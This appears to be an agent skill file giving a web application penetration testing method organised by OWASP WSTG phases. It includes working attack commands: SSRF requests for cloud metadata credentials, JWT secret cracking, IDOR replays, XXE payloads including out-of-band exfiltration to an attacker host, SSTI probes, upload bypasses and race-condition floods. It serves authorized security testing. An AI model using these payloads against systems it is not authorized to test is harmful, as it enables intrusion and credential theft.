---
name: pt-web
description: Use when testing a web application for vulnerabilities — authentication and session flaws, broken access control, IDOR, SSRF, injection, file upload, deserialization, business-logic abuse, or when converting manual web testing into reproducible findings — including Russian requests (тестирование веб-приложения, поиск уязвимостей на сайте, проверка авторизации). Follows OWASP WSTG categories.
version: 1.0.0
author: operator
tags: [offensive, web, owasp, wstg, injection, access-control]
---

# Web Application Testing

Method over payload lists. The order matters: **map the app → map the auth model → break authorization → then inject**. Most real-world impact lives in access control, not in exotic injections.

## Phase 1: Map before touching

```bash
# Content discovery, tuned to a baseline
ffuf -u https://<host>/FUZZ -w raft-medium-directories.txt -mc all -fc 404 \
  -fs <size-of-404-page> -t 40 -o scans/http/ffuf-dirs.json -of json

# Files with extensions, plus backup/source patterns
ffuf -u https://<host>/FUZZ -w raft-medium-files.txt -e .php,.bak,.old,.zip,.tar.gz,.sql,.env,.map \
  -mc 200,301,302,403 -t 40

# Parameter discovery on a known endpoint
arjun -u "https://<host>/api/search" -m GET,POST
```

Then read what you found: robots.txt, sitemap.xml, `/api`, `/graphql`, `/swagger.json`, `.git/HEAD`, `/.env`, `/.well-known/`, error pages with stack traces, sourcemaps.

Build `notes\web-<host>.md`:

```markdown
## Routes
| Method | Path | Auth | Roles | Params | Notes |
|---|---|---|---|---|---|
| GET | /api/v1/invoices/{id} | bearer | user | id | sequential ids |
## Roles / accounts
user_a, user_b, admin, anon (password refs in loot\creds)
## Tech
framework, versions, WAF behavior, session mechanism
```

## Phase 2: Authentication and session

| Check | Technique |
|---|---|
| User enumeration | Compare response body/length/timing for valid vs invalid login and password reset |
| Password policy / lockout | Count attempts on a throwaway account, stay inside RoE limits |
| MFA bypass | Direct navigation past MFA step, response manipulation, backup-code brute, OTP reuse |
| Session fixation | Set a chosen session id pre-login, see if it survives authentication |
| Session lifetime | Logout server-side invalidation, idle timeout, cookie flags `Secure; HttpOnly; SameSite` |
| JWT | `alg:none`, weak HMAC secret, `kid` path traversal/SQLi, `jku`/`x5u` pointing at your host, algorithm confusion RS→HS |
| OAuth/OIDC | `redirect_uri` bypass, missing `state`, implicit flow, token leakage in referrer, `scope` escalation |

```bash
# JWT: inspect and attack
jwt_tool <token> -M at          # all tests
hashcat -m 16500 jwt.txt rockyou.txt   # HS256 secret crack
jwt_tool <token> -T              # tamper payload, re-sign with discovered key
```

## Phase 3: Authorization — where the findings are

The single highest-yield test in modern apps. Do it early and do it systematically.

Method:

1. Create two accounts at the same role (`user_a`, `user_b`) and one higher role if provisioned.
2. For **every** object-referencing request, replay `user_a`'s request with `user_b`'s token and with `user_b`'s object id.
3. Repeat for every verb: `GET`, `PUT`, `PATCH`, `DELETE`, and bulk endpoints.
4. Repeat on nested resources: `/users/{a}/invoices/{b}`, and on query/filter params: `?tenant=`, `?org_id=`.
5. Test *horizontal* (same role, other's data) and *vertical* (lower role, admin action).

```bash
# BOLA replay: swap token, keep object id
curl -s -H "Authorization: Bearer $TOKEN_B" https://<host>/api/invoices/$ID_A

# Verb tampering on a protected route
for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  curl -s -o /dev/null -w "$m %{http_code}\n" -X $m -H "Authorization: Bearer $TOKEN_A" https://<host>/api/admin/users
done
```

Also test: forced browsing to admin routes, mass-assignment (`role`, `is_admin`, `tenant_id`, `balance` in a profile update), GraphQL field-level authz (see `pt-api`), and tenant isolation via headers (`X-Tenant-Id`, `Host`).

## Phase 4: Injection and server-side

### SSRF

```bash
# Direct
curl "https://<host>/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# AWS, GCP (needs header), Azure (needs header)
curl -H "Metadata-Flavor: Google"  "http://<host>/fetch?u=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -H "Metadata: true" "http://<host>/fetch?u=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Bypass filters with: decimal/octal IP (`2852039166`), IPv6-mapped (`[::ffff:169.254.169.254]`), DNS rebinding, redirect chains, `@` in userinfo, alternate schemes (`gopher://`, `dict://`, `file://`), URL parsing differences.

### SSTI

Probe matrix — one probe per engine family, then escalate:

```text
{{7*7}}      Twig/Jinja2/Nunjucks    49
${7*7}       FreeMarker/JSP EL       49
<%= 7*7 %>   ERB/EJS                49
#{7*7}       Ruby/Slim              49
${{7*7}}     Handlebars             49
@(7*7)       Razor                  49
```

Identification beyond multiplication: `{{7*'7'}}` → `7777777` (Jinja2) vs `49` (Twig). Then read `/etc/passwd` or `id` for proof; escalate to RCE via the engine's documented gadget chain.

### XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
<!-- OOB exfil when the body is not reflected -->
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://<your-host>/x.dtd"> %p;]>
```

Test on: SOAP endpoints, SAML assertions, DOCX/XLSX/SVG uploads, `Content-Type: application/xml` swaps, RSS/import features.

### Deserialization

| Stack | Signal | Tool |
|---|---|---|
| Java | `rO0AB`, `aced0005`, `Content-Type: application/x-java-serialized-object` | `ysoserial`, gadget chain by library |
| .NET | `AAEAAAD/////`, ViewState without MAC | `ysoserial.net` |
| PHP | `O:8:"stdClass"`, base64 in cookie | `phpggc` |
| Python | pickle base64 in cookie/queue | handcrafted `__reduce__` |
| Node | `{"rce":"_$$ND_FUNC$$_"}` | node-serialize |

### File upload

- Extension bypass: `.php5 .phtml .phar .php. .php::$DATA .jspx .aspx`, double extension `shell.jpg.php`
- Content-Type and magic-byte mismatch; polyglot GIF+PHP
- Path traversal in filename; zip-slip on archive import
- SVG with embedded script; XXE inside image metadata
- Where it lands: webroot vs uploads dir vs object storage — check whether the file is executed or only served

### Race conditions

```bash
# Fire N identical requests truly in parallel (single-packet or HTTP/2 multiplexing beats xargs)
seq 20 | xargs -P 20 -I{} curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST https://<host>/api/redeem -H "Authorization: Bearer $T" -d 'code=GIFT50'
```

Use for: coupon/discount reuse, balance withdrawal, invite acceptance, one-per-user limits, approval flows.

## Phase 5: Business logic

Not fuzzable. Read the workflow and ask "what did the developer assume?":

- Step skipping (pay → confirm, without pay)
- Negative quantities, zero price, currency confusion
- Approving your own request; reusing another's approval token
- Trial reset via email case/plus-address; downgrade then re-upgrade for double credit
- Refund after delivery; partial refund loops
- Time-of-check/time-of-use on inventory and quotas

## Per-finding note

```markdown
### WEB-03 Broken object-level authorization on /api/v1/invoices/{id}
Severity: High (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
Precondition: two accounts (user_a, user_b)
Request: curl -H "Authorization: Bearer $TOKEN_B" https://host/api/v1/invoices/<id_of_a>
Observed: 200, returns user_a invoice with PII
Expected: 403
Evidence: pocs/WEB-03/{request.txt,response.txt,screenshot.png}
```

## High-yield checklist

- [ ] Auth bypass on every admin route (forced browse, verb tamper, header spoof)
- [ ] IDOR/BOLA on every object id, all verbs, both directions
- [ ] Mass assignment on profile/registration/tenant endpoints
- [ ] SSRF on any URL parameter, webhook, importer, PDF generator
- [ ] Upload → execution path traced end to end
- [ ] Password reset token: predictability, reuse, host-header poisoning
- [ ] GraphQL introspection and field-level authz
- [ ] Race on every "once per user" action
- [ ] Error handling: stack traces, SQL errors, debug endpoints
- [ ] CORS: `Origin: https://evil.com` reflected with credentials
- [ ] Cache poisoning/deception on unkeyed headers
- [ ] Host header injection in reset links and absolute redirects

## Common mistakes

| Mistake | Reality |
|---|---|
| Fuzzing payload lists before mapping roles | You test the wrong surface for hours |
| Reporting a 200 as IDOR without checking the body | Empty response or your own data is not a finding |
| Ignoring state-changing verbs | Most BOLA lives in PUT/PATCH/DELETE |
| Testing SSRF only with `http://127.0.0.1` | Cloud metadata and DNS rebinding are where the impact is |
| Sending a 40-thread scanner at production | WAF block, client incident, RoE breach |
| One screenshot, no request/response | Unverifiable finding, fails retest |
